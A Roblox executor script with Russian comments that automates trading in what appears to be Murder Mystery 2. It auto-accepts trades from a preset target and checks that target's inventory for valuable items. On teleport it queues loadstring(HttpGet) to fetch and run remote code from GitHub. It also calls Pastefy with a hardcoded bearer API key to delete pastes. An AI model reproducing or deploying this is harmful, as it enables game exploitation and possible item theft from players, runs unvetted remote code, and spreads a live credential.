getgenv().gg = false
if getgenv().gg then
    print("already")
    return
end

getgenv().gg = true
function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end

queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))

repeat wait() until game:IsLoaded()
local virtualUser = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    virtualUser:CaptureController()
    virtualUser:ClickButton2(Vector2.new())
end)

game.Players.LocalPlayer.OnTeleport:Connect(function()
    if queueteleport then
        queueteleport("loadstring(game:HttpGet('https://github.com/Roma77799/testik/raw/refs/heads/main/test1',true))()")
    else
        print("queue нету")
    end
end)
local TeleportService = game:GetService("TeleportService")
local player = game:GetService("Players").LocalPlayer
repeat wait(1) print("пг грузится") until player:FindFirstChild("PlayerGui") and player.Character and player.Character:FindFirstChild("Humanoid")

print("pg загружен")
local playerGui = player:WaitForChild("PlayerGui")

task.spawn(function()
    print("таск спавн запущен")
    local start = tick()
    while playerGui:FindFirstChild("Loading") and tick() - start < 66 do
        task.wait(0.5)
    end
    if playerGui:FindFirstChild("Loading") then
        TeleportService:Teleport(18845424641)
        return
    end
end)

offer = false
getgenv().stop = false

repeat
    wait(1)
    print("waiting for device")

    local deviceSelect = playerGui:FindFirstChild("DeviceSelect")
    if not deviceSelect then
        break
    end

    local container = deviceSelect:FindFirstChild("Container")
    if not container then
        break
    end

    local tablet = container:FindFirstChild("Tablet")
    if not tablet then
        break
    end

    local selectt = tablet:FindFirstChild("Button")
    if not selectt then
        print("selectt не найден, выходим из цикла")
        break
    end

    -- Если нашли кнопку, кликаем
    local connections = getconnections(selectt.MouseButton1Click)
    if connections and connections[1] then
        connections[1]:Fire()
    end

until not playerGui:FindFirstChild("DeviceSelect")


local targetName = getgenv().name
local function get_device_type()
    repeat wait(1) 
        print('waiting2')
    until player.PlayerGui:FindFirstChild("MainGUI")
    local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI
    local lobbygui = maingui:FindFirstChild("Lobby")
    local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil
    return MobileState and 'mobile' or 'tablet'
end

local DEVICE_TYPE = get_device_type()

game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(args)
    lastOfferTime = args.LastOffer
end)
local tradeGUI2 = playerGui:WaitForChild("TradeGUI")
local TDselect = DEVICE_TYPE == 'tablet' and tradeGUI2

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local container = TDselect:WaitForChild("Container")
-- Получаем кнопки
local actions = container:WaitForChild("Trade"):WaitForChild("Actions")
local acceptcon = actions:WaitForChild("Accept")

local function normalizeName(name)
    return string.gsub(name, "[()%[%]{}]", "")
end

local function checkTrade()
    local container = TDselect:FindFirstChild("Container")
    local tradeFrame = container and container:FindFirstChild("Trade")
    local theirOffer = tradeFrame and tradeFrame:FindFirstChild("TheirOffer")
    local usernameLabel = theirOffer and theirOffer:FindFirstChild("Username")

    if not usernameLabel then
        return
    end

    local usernameText = usernameLabel.Text
    local cleanName = normalizeName(usernameText)

    if cleanName ~= targetName then
        warn("ne v spiske")
        ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
    else
        print("sus")
    end
end

TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
    if TDselect.Enabled then
        checkTrade()
    else
        print("финики закрыто.")
    end
end)

TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
    if TDselect.Enabled then
        local firstSlot = TDselect.Container.Trade.TheirOffer.Container.NewItem1
        repeat
            wait(0.7)
            if not TDselect.Enabled then
                print("трейд закрылся в логике офера")
                offer = false
                return
            end
        until firstSlot.Visible
        offer = true

        local cooldown = acceptcon:WaitForChild("Cooldown")

        repeat
            wait(0.5)
            if not TDselect.Enabled then
                print("трейд закрылся в логике кулдавна")
                offer = false
                return
            end
        until not cooldown.Visible
        offer = true

        print("cool")
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferTime)
    else
        offer = false
        print("трейд гай закрылся")
    end
end)
local HttpService = game:GetService("HttpService")

apiKey = "S3mWs7P1fzVUPTmcjjpvekjKO7N72sI0tZFgVx5N2FS92yCP6XkxniDX4mND"

deleteUrl = "https://pastefy.app/api/v2/paste/" .. getgenv().paste

function deletePaste()
    while true do
        local response = request({
            Url = deleteUrl,
            Method = "DELETE",
            Headers = {
                Accept = "application/json",
                ["Authorization"] = "Bearer " .. apiKey,
            },
        })

        if not response then
            warn("[Pastefy] No response, retrying...")
            task.wait(1)
            continue
        end

        -- УСПЕХ: 204 или 200
        if response.StatusCode == 204 or response.StatusCode == 200 then
            warn("Прошлая паста успешно удалена")
            return
        end

        local parsed
        if response.Body and response.Body ~= "" then
            local ok, res = pcall(HttpService.JSONDecode, HttpService, response.Body)
            if ok then parsed = res end
        end

        if parsed and (
            parsed.exception == "RateLimitException"
            or parsed.exception == "TimeoutException"
        ) then
            warn("API limit / timeout, waiting 6s...")
            task.wait(6)
            continue
        end

        -- 404 = пасты больше нет → СЧИТАЕМ УСПЕХОМ
        if response.StatusCode == 404 then
            warn("Paste already deleted (404)")
            return
        end

        warn("Server error:", response.StatusCode)
        task.wait(6)
    end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage:WaitForChild("Trade")

task.spawn(function()
    local startTime = os.time()
    while true do
        wait(1.7)

        local success, status = pcall(function()
            return Trade.GetTradeStatus:InvokeServer()
        end)

        -- Если получили статус и он "StartTrade", сбрасываем таймер
        if success and status == "StartTrade" and offer == true then
            startTime = os.time()  -- трейд начался, обновляем таймер
        end

        -- Проверяем таймаут
        local now = os.time()
        if now - startTime >= 110 then
            print("❌ В течение 120 секунд статус не стал 'StartTrade'.")
            deletePaste()
            if getgenv().stop then
                print("already hop")
                return
            end
            getgenv().stop = true
            TeleportService:Teleport(18845424641)
            break
        end
    end
end)

-- Функция проверки
local function checkPlayer()
    print("слушаем наличие игрока")
    local targetPlayer = Players:FindFirstChild(targetName)

    if targetPlayer then
        print(targetName .. " найден в игре!")
    else
        print(targetName .. " не найден, вас кикают!")
        if LocalPlayer then
            print("Игрок " .. targetName .. " не найден в игре!")
            deletePaste()
            if getgenv().stop then
                print("already hop")
                return
            end
            getgenv().stop = true
            TeleportService:Teleport(18845424641)
            return
        end
    end
end

goodItems = {
    "Sorry",
    "Scythe",
    "Celestial",
    "ElderwoodScythe",
    "Gingerscope",
    "Hallowscythe",
    "Harvester",
    "Icebreaker",
    "Icepiercer",
    "Icewing",
    "Logchopper",
    "NikKnife",
    "SwirlyAxe",
    "TravelerAxe",
    "VampireAxe",
    "UFOKnifeChroma",
    "UFOKnife",
    "Amerilaser",
    "AuroraKnife",
    "ZombieBat",
    "BattleAxe",
    "BattleAxe2",
    "Bauble",
    "BaubleChroma",
    "Bioblade",
    "Blaster",
    "BlizzardChroma",
    "Blizzard",
    "Bloom",
    "Blossom_G",
    "BlueSeer",
    "BonebladeChroma",
    "Boneblade",
    "AuroraGun",
    "CandleflameChroma",
    "Candleflame",
    "Candy",
    "Chill",
    "Clockwork",
    "Constellation",
    "ConstellationChroma",
    "Cookieblade",
    "Gingermint_K",
    "Gingermint_KChroma",
    "ChromaDarkbringer",
    "Darkbringer",
    "Darkshot",
    "Darksword",
    "DeathshardChroma",
    "Deathshard",
    "Eggblade",
    "ElderwoodKnifeChroma",
    "ElderwoodKnife",
    "ElderwoodGun",
    "Eternal",
    "Eternal2",
    "Eternal3",
    "Eternal4",
    "EternalCane",
    "TreeKnife2023Chroma",
    "TreeKnife2023",
    "TreeGun2023Chroma",
    "TreeGun2023",
    "FangChroma",
    "Fang",
    "Flames",
    "Flora",
    "FlowerwoodKnife",
    "FlowerwoodGun",
    "Frostbite",
    "Frostsaber",
    "Gemstone",
    "GemstoneChroma",
    "Ghostblade",
    "GingerLuger",
    "GingerbladeChroma",
    "Gingerblade",
    "Gingermint_G",
    "GreenLuger",
    "HallowsBlade",
    "Hallow",
    "Hallowgun",
    "Handsaw",
    "Heartblade",
    "Heat",
    "HeatChroma",
    "IceDragon",
    "IceShard",
    "Icebeam",
    "Iceblaster",
    "Iceflake",
    "Jinglegun",
    "Laser",
    "LaserChroma",
    "ChromaLightbringer",
    "Lightbringer",
    "LugerChroma",
    "Luger",
    "Lugercane",
    "Makeshift",
    "Minty",
    "Nebula",
    "Nightblade",
    "Ocean_G",
    "AmericaSword",
    "OrangeSeer",
    "BaubleKnife",
    "BaubleKnifeChroma",
    "Pearl_K",
    "Pearl_G",
    "Peppermint",
    "Phantom2022",
    "Pixel",
    "Plasmabeam",
    "Plasmablade",
    "Prismatic",
    "Pumpking",
    "PurpleSeer",
    "Rainbow_K",
    "Rainbow_G",
    "RaygunChroma",
    "Raygun",
    "RedLuger",
    "RedSeer",
    "Sakura_K",
    "SawChroma",
    "Saw",
    "TheSeer",
    "SeerChroma",
    "Shark",
    "SharkChroma",
    "Slasher",
    "SlasherChroma",
    "SnowDaggerChroma",
    "SnowDagger",
    "Snowcannon",
    "SnowcannonChroma",
    "Snowflake",
    "Snowstorm",
    "SnowstormChroma",
    "WraithGun",
    "Spectre2022",
    "Spider",
    "WraithKnife",
    "Sugar",
    "SunsetGun",
    "SunsetGunChroma",
    "SunsetKnifeChroma",
    "SunsetKnife",
    "SwirlyBlade",
    "SwirlyGunChroma",
    "SwirlyGun",
    "TidesChroma",
    "Tides",
    "TravelerGunChroma",
    "TravelerGun",
    "Turkey2023",
    "VampiresEdge",
    "VampireGunChroma",
    "VampireGun",
    "Virtual",
    "WatergunChroma",
    "Watergun",
    "Waves_K",
    "WintersEdge",
    "XenoKnife",
    "XenoGun",
    "Xmas",
    "YellowSeer",
    "Aquarium_G_2025",
    "Aquarium_K_2025",
    "Arctic_G_2022",
    "Arctic_K_2022",
    "Aurora_K_2021",
    "Aurora_G_2021",
    "Beach_K_2023",
    "EliteBlue",
    "Broken_K_2023",
    "Bunnies_K_2025",
    "Cavern_G_2019",
    "Cavern_K_2019",
    "Chromatic_K_2023",
    "Chromatic_G_2023",
    "CottonCandy",
    "Cursed_G_2024",
    "Cursed_K_2024",
    "Elite",
    "Emerald",
    "Energized_G_2025",
    "Energized_K_2025",
    "Fade",
    "Frostfade_K_2023",
    "Frostfade_G_2023",
    "Frozen_K_2025",
    "Frozen_G_2025",
    "Fusion",
    "GhostK2018",
    "GhostG2018",
    "Ginger_G_2018",
    "Ginger_K_2018",
    "EliteGreen",
    "GreenFire",
    "Icecracker_K_2020",
    "Icedriller_G_2020",
    "JD",
    "Latte_K_2023",
    "Latte_G_2023",
    "Midnight",
    "Constellation_G_2024",
    "Constellation_K_2024",
    "Overseer",
    "OverseerKnife",
    "Palms_G_2024",
    "Palms_K_2024",
    "Plasmite",
    "Predator",
    "PredatorKnife",
    "RedFire",
    "Ripper_G_2020",
    "Ripper_K_2020",
    "Rune",
    "Bleed",
    "SantasMagic",
    "SantasSpirit",
    "ScratchBlue",
    "Scratch",
    "MLG",
    "Skulls",
    "Sparkle",
    "Spectral_G_2021",
    "Spectral_K_2021",
    "Splash_G",
    "Splash",
    "Traveler_K_2023",
    "Traveler_G_2023",
    "Tree",
    "TreeGun",
    "Universe",
    "Vampire_K_2022",
    "Vampire_G_2022",
    "Viper",
    "Web",
    "Witched",
    "Cane_K_2018",
}


local function checkInventory()
    local success, result = pcall(function()
        return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(targetName)
    end)

    if not success or not result then
        warn("Не удалось получить инвентарь")
        return
    end

    local owned = result.Weapons and result.Weapons.Owned or {}

    local hasGoodItem = false

    for _, goodName in ipairs(goodItems) do
        if owned[goodName] then
            hasGoodItem = true
            break
        end
    end

    if not hasGoodItem then
        deletePaste()
        if not getgenv().stop then
            getgenv().stop = true
            TeleportService:Teleport(18845424641)
        end
    else
        print("Найден ценный предмет")
    end
end


print("Скрипт загружен")
foundPlayer = nil
task.spawn(function()
    while true do
        checkPlayer()
        checkInventory()
        if math.random() < 0.5 then
            if Trade:FindFirstChild("AcceptRequest") then
                Trade.AcceptRequest:FireServer()
            end
        else
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Name == targetName then
                    foundPlayer = player
                    break
                end
            end
            if Trade:FindFirstChild("SendRequest") then
                Trade.SendRequest:InvokeServer(foundPlayer)
            end
        end
        wait(2)
    end
end)
